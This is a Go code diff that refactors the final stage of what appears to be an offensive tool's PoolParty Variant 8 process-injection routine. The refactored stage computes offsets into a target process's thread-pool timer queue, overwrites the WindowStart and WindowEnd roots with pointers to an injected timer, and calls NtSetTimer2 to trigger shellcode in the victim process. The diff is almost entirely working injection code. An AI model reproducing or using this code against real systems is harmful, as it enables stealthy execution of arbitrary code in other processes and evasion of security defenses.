@@ -429,70 +429,61 @@ func executeVariant8(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 	}
 	output += fmt.Sprintf("[+] Wrote timer item structure (%d bytes)\n", bytesWritten)
 
-	// Step 11: Calculate addresses for WindowStart and WindowEnd roots in target pool
+	output, err = poolPartyV8LinkTimerQueue(hProcess, hTimer, workerFactoryInfo.StartParameter, tpTimerAddr, timeout, output)
+	if err != nil {
+		return output, err
+	}
+	output += "[+] PoolParty Variant 8 injection completed successfully\n"
+	return output, nil
+}
 
-	// Step 12: Update pool's TimerQueue WindowStart and WindowEnd roots to point to our timer
-	// SafeBreach writes to pTpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowStart.Root
-
-	targetTpPoolAddr := workerFactoryInfo.StartParameter
-
-	// Calculate offsets step by step - Go doesn't handle nested offsetof well
+func poolPartyV8LinkTimerQueue(hProcess uintptr, hTimer windows.Handle, poolAddr uintptr, tpTimerAddr uintptr, timeout int64, output string) (string, error) {
 	var dummyPool FULL_TP_POOL
 	var dummyTimerQueue TPP_TIMER_QUEUE
 	var dummySubQueue TPP_TIMER_SUBQUEUE
+	var dummyTimer FULL_TP_TIMER
 
-	timerQueueOffset := uintptr(unsafe.Offsetof(dummyPool.TimerQueue))
-	absoluteQueueOffset := uintptr(unsafe.Offsetof(dummyTimerQueue.AbsoluteQueue))
-	windowStartOffset := uintptr(unsafe.Offsetof(dummySubQueue.WindowStart))
-	windowEndOffset := uintptr(unsafe.Offsetof(dummySubQueue.WindowEnd))
+	timerQueueOff := uintptr(unsafe.Offsetof(dummyPool.TimerQueue))
+	absQueueOff := uintptr(unsafe.Offsetof(dummyTimerQueue.AbsoluteQueue))
+	winStartOff := uintptr(unsafe.Offsetof(dummySubQueue.WindowStart))
+	winEndOff := uintptr(unsafe.Offsetof(dummySubQueue.WindowEnd))
 
-	// WindowStart.Root and WindowEnd.Root - Root is first field of TPP_PH so offset is 0
-	windowStartRootAddr := targetTpPoolAddr + timerQueueOffset + absoluteQueueOffset + windowStartOffset
-	windowEndRootAddr := targetTpPoolAddr + timerQueueOffset + absoluteQueueOffset + windowEndOffset
+	windowStartRootAddr := poolAddr + timerQueueOff + absQueueOff + winStartOff
+	windowEndRootAddr := poolAddr + timerQueueOff + absQueueOff + winEndOff
 
-	// Calculate address of our timer's WindowStartLinks and WindowEndLinks
-	remoteWindowStartLinksAddr := tpTimerAddr + uintptr(unsafe.Offsetof(dummyTimer.WindowStartLinks))
-	remoteWindowEndLinksAddr := tpTimerAddr + uintptr(unsafe.Offsetof(dummyTimer.WindowEndLinks))
+	remoteWinStartAddr := tpTimerAddr + uintptr(unsafe.Offsetof(dummyTimer.WindowStartLinks))
+	remoteWinEndAddr := tpTimerAddr + uintptr(unsafe.Offsetof(dummyTimer.WindowEndLinks))
 
-	output += fmt.Sprintf("[*] Debug: targetTpPoolAddr = 0x%X\n", targetTpPoolAddr)
-	output += fmt.Sprintf("[*] Debug: timerQueueOffset = 0x%X, absoluteQueueOffset = 0x%X\n", timerQueueOffset, absoluteQueueOffset)
-	output += fmt.Sprintf("[*] Debug: windowStartOffset = 0x%X, windowEndOffset = 0x%X\n", windowStartOffset, windowEndOffset)
+	output += fmt.Sprintf("[*] Debug: targetTpPoolAddr = 0x%X\n", poolAddr)
+	output += fmt.Sprintf("[*] Debug: timerQueueOffset = 0x%X, absoluteQueueOffset = 0x%X\n", timerQueueOff, absQueueOff)
+	output += fmt.Sprintf("[*] Debug: windowStartOffset = 0x%X, windowEndOffset = 0x%X\n", winStartOff, winEndOff)
 	output += fmt.Sprintf("[*] Debug: windowStartRootAddr = 0x%X\n", windowStartRootAddr)
 	output += fmt.Sprintf("[*] Debug: windowEndRootAddr = 0x%X\n", windowEndRootAddr)
-	output += fmt.Sprintf("[*] Debug: remoteWindowStartLinksAddr = 0x%X\n", remoteWindowStartLinksAddr)
-	output += fmt.Sprintf("[*] Debug: remoteWindowEndLinksAddr = 0x%X\n", remoteWindowEndLinksAddr)
+	output += fmt.Sprintf("[*] Debug: remoteWindowStartLinksAddr = 0x%X\n", remoteWinStartAddr)
+	output += fmt.Sprintf("[*] Debug: remoteWindowEndLinksAddr = 0x%X\n", remoteWinEndAddr)
 
-	// Write WindowStartLinks address to WindowStart.Root
-	windowStartBytes := (*[8]byte)(unsafe.Pointer(&remoteWindowStartLinksAddr))[:]
-	_, err = injectWriteMemory(hProcess, windowStartRootAddr, windowStartBytes)
-	if err != nil {
+	winStartBytes := (*[8]byte)(unsafe.Pointer(&remoteWinStartAddr))[:]
+	if _, err := injectWriteMemory(hProcess, windowStartRootAddr, winStartBytes); err != nil {
 		return output, fmt.Errorf("memory write for WindowStart.Root failed: %w", err)
 	}
 
-	// Write WindowEndLinks address to WindowEnd.Root
-	windowEndBytes := (*[8]byte)(unsafe.Pointer(&remoteWindowEndLinksAddr))[:]
-	_, err = injectWriteMemory(hProcess, windowEndRootAddr, windowEndBytes)
-	if err != nil {
+	winEndBytes := (*[8]byte)(unsafe.Pointer(&remoteWinEndAddr))[:]
+	if _, err := injectWriteMemory(hProcess, windowEndRootAddr, winEndBytes); err != nil {
 		return output, fmt.Errorf("memory write for WindowEnd.Root failed: %w", err)
 	}
 	output += "[+] Modified target process's pool timer queue to point to timer item\n"
 
-	// Step 13: Set the timer to expire via NtSetTimer2
-	var dueTime int64
-	dueTime = timeout
-
+	dueTime := timeout
 	var params T2_SET_PARAMETERS
-	status, _, _ = procNtSetTimer2.Call(
+	status, _, _ := procNtSetTimer2.Call(
 		uintptr(hTimer),
 		uintptr(unsafe.Pointer(&dueTime)),
-		0, // Period
+		0,
 		uintptr(unsafe.Pointer(&params)),
 	)
 	if status != 0 {
 		return output, fmt.Errorf("timer set failed: 0x%X", status)
 	}
 	output += "[+] Set timer to expire and trigger TppTimerQueueExpiration\n"
-	output += "[+] PoolParty Variant 8 injection completed successfully\n"
-
 	return output, nil
 }
